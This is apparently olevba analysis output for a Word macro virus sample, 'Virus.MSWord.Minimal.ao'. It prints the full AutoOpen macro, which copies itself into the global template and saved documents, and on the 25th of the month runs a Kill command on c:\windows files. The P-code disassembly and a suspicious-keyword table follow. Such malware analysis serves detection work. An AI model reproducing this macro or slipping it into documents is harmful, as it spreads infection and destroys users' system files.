olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.ao
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.ao - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoopeN.bas 
in file: Virus.MSWord.Minimal.ao - OLE stream: 'Macros/VBA/AutoopeN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
Dim a$
Dim b$
Dim c$
c$ = WordBasic.[FileName$]()
On Error Resume Next: a$ = c$ + ":AutoopeN"
b$ = "Global:aUTOOPEn": WordBasic.MacroCopy a$, b$
WordBasic.FileSaveAs Format:=1: WordBasic.MacroCopy b$, a$
If (Day(Now()) = 25) Then
    Kill "c:\windows\*.*"
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Minimal.ao
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoopeN - 1430 bytes
' Line #0:
' 	FuncDefn (Public Sub MAIN())
' Line #1:
' 	Dim 
' 	VarDefn a
' Line #2:
' 	Dim 
' 	VarDefn B
' Line #3:
' 	Dim 
' 	VarDefn c
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St c$ 
' Line #5:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	Ld c$ 
' 	LitStr 0x0009 ":AutoopeN"
' 	Add 
' 	St a$ 
' Line #6:
' 	LitStr 0x000F "Global:aUTOOPEn"
' 	St B$ 
' 	BoS 0x0000 
' 	Ld a$ 
' 	Ld B$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #7:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	BoS 0x0000 
' 	Ld B$ 
' 	Ld a$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #9:
' 	LitStr 0x000E "c:\windows\*.*"
' 	ArgsCall Kill 0x0001 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoopeN            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

